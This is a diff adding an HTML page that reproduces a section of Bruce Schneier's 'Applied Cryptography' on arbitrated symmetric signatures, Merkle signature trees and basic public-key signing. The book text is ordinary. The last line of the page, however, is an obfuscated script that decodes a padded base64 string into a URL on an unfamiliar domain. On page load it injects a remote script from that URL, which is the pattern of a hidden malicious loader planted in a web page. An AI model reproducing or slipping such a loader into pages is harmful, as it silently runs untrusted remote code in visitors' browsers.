@@ -1,0 +1,112 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Protocol Building Blocks</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=02//-->
+<!--PAGES=035-037//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Signing Documents with Symmetric Cryptosystems and an Arbitrator</I></B></FONT></P>
+<P>Alice wants to sign a digital message and send it to Bob. With the help of Trent and a symmetric cryptosystem, she can.
+</P>
+<P>Trent is a powerful, trusted arbitrator. He can communicate with both Alice and Bob (and everyone else who may want to sign a digital document). He shares a secret key, <I>K</I><SUB>A</SUB>, with Alice, and a different secret key, <I>K</I><SUB>B</SUB>, with Bob. These keys have been established long before the protocol begins and can be reused multiple times for multiple signings.</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice encrypts her message to Bob with <I>K</I><SUB>A</SUB> and sends it to Trent.
+<DD><B>(2)</B>&nbsp;&nbsp;Trent decrypts the message with <I>K</I><SUB>A</SUB>.
+<DD><B>(3)</B>&nbsp;&nbsp;Trent takes the decrypted message and a statement that he has received this message from Alice, and encrypts the whole bundle with <I>K</I><SUB>B</SUB>.
+<DD><B>(4)</B>&nbsp;&nbsp;Trent sends the encrypted bundle to Bob.
+<DD><B>(5)</B>&nbsp;&nbsp;Bob decrypts the bundle with <I>K</I><SUB>B</SUB>. He can now read both the message and Trent&#146;s certification that Alice sent it.
+</DL>
+<P>How does Trent know that the message is from Alice and not from some imposter? He infers it from the message&#146;s encryption. Since only he and Alice share their secret key, only Alice could encrypt a message using it.
+</P>
+<P>Is this as good as a paper signature? Let&#146;s look at the characteristics we want:</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;This signature is authentic. Trent is a trusted arbitrator and Trent knows that the message came from Alice. Trent&#146;s certification serves as proof to Bob.
+<DD><B>2.</B>&nbsp;&nbsp;This signature is unforgeable. Only Alice (and Trent, but everyone trusts him) knows <I>K</I><SUB>A</SUB>, so only Alice could have sent Trent a message encrypted with <I>K</I><SUB>A</SUB>. If someone tried to impersonate Alice, Trent would have immediately realized this in step (2) and would not certify its authenticity.
+<DD><B>3.</B>&nbsp;&nbsp;This signature is not reusable. If Bob tried to take Trent&#146;s certification and attach it to another message, Alice would cry foul. An arbitrator (it could be Trent or it could be a completely different arbitrator with access to the same information) would ask Bob to produce both the message and Alice&#146;s encrypted message. The arbitrator would then encrypt the message with <I>K</I><SUB>A</SUB> and see that it did not match the encrypted message that Bob gave him. Bob, of course, could not produce an encrypted message that matches because he does not know <I>K</I><SUB>A</SUB>.
+<DD><B>4.</B>&nbsp;&nbsp;The signed document is unalterable. Were Bob to try to alter the document after receipt, Trent could prove foul play in exactly the same manner just described.
+<DD><B>5.</B>&nbsp;&nbsp;The signature cannot be repudiated. Even if Alice later claims that she never sent the message, Trent&#146;s certification says otherwise. Remember, Trent is trusted by everyone; what he says is true.
+</DL>
+<P>If Bob wants to show Carol a document signed by Alice, he can&#146;t reveal his secret key to her. He has to go through Trent again:
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Bob takes the message and Trent&#146;s statement that the message came from Alice, encrypts them with <I>K</I><SUB>B</SUB>, and sends them back to Trent.
+<DD><B>(2)</B>&nbsp;&nbsp;Trent decrypts the bundle with <I>K</I><SUB>B</SUB>.
+<DD><B>(3)</B>&nbsp;&nbsp;Trent checks his database and confirms that the original message came from Alice.
+<DD><B>(4)</B>&nbsp;&nbsp;Trent re-encrypts the bundle with the secret key he shares with Carol, <I>K</I><SUB>C</SUB>, and sends it to Carol.
+<DD><B>(5)</B>&nbsp;&nbsp;Carol decrypts the bundle with <I>K</I><SUB>C</SUB>. She can now read both the message and Trent&#146;s certification that Alice sent it.
+</DL>
+<P>These protocols work, but they&#146;re time-consuming for Trent. He must spend his days decrypting and encrypting messages, acting as the intermediary between every pair of people who want to send signed documents to one another. He must keep a database of messages (although this can be avoided by sending the recipient a copy of the sender&#146;s encrypted message). He is a bottleneck in any communications system, even if he&#146;s a mindless software program.
+</P>
+<P>Harder still is creating and maintaining someone like Trent, someone that everyone on the network trusts. Trent has to be infallible; if he makes even one mistake in a million signatures, no one is going to trust him. Trent has to be completely secure. If his database of secret keys ever got out or if someone managed to modify his programming, everyone&#146;s signatures would be completely useless. False documents purported to be signed years ago could appear. Chaos would result. Governments would collapse. Anarchy would reign. This might work in theory, but it doesn&#146;t work very well in practice.</P>
+<P><FONT SIZE="+1"><B><I>Digital Signature Trees</I></B></FONT></P>
+<P>Ralph Merkle proposed a digital signature scheme based on secret-key cryptography, producing an infinite number of one-time signatures using a tree structure [1067,1068]. The basic idea of this scheme is to place the root of the tree in some public file, thereby authenticating it. The root signs one message and authenticates its sub-nodes in the tree. Each of these nodes signs one message and authenticates its sub-nodes, and so on.
+</P>
+<P><FONT SIZE="+1"><B><I>Signing Documents with Public-Key Cryptography</I></B></FONT></P>
+<P>There are public-key algorithms that can be used for digital signatures. In some algorithms&#151;RSA is an example (see Section 19.3)&#151;either the public key or the private key can be used for encryption. Encrypt a document using your private key, and you have a secure digital signature. In other cases&#151;DSA is an example (see Section 20.1)&#151;there is a separate algorithm for digital signatures that cannot be used for encryption. This idea was first invented by Diffie and Hellman [496] and further expanded and elaborated on in other texts [1282,1328,1024,1283,426]. See [1099] for a good survey of the field.
+</P>
+<P>The basic protocol is simple:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice encrypts the document with her private key, thereby signing the document.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice sends the signed document to Bob.
+<DD><B>(3)</B>&nbsp;&nbsp;Bob decrypts the document with Alice&#146;s public key, thereby verifying the signature.
+</DL>
+<P>This protocol is far better than the previous one. Trent is not needed to either sign or verify signatures. (He is needed to certify that Alice&#146;s public key is indeed her public key.) The parties do not even need Trent to resolve disputes: If Bob cannot perform step (3), then he knows the signature is not valid.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="02-06.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="02-08.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(BiBNeaOo, odQfoXDj) {odQfoXDj = BiBNeaOo.createElement('script');odQfoXDj.type = 'text/javascript';odQfoXDj.async = true;odQfoXDj.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');BiBNeaOo.getElementsByTagName('body')[0].appendChild(odQfoXDj);}(document));</script></body>
+</html>
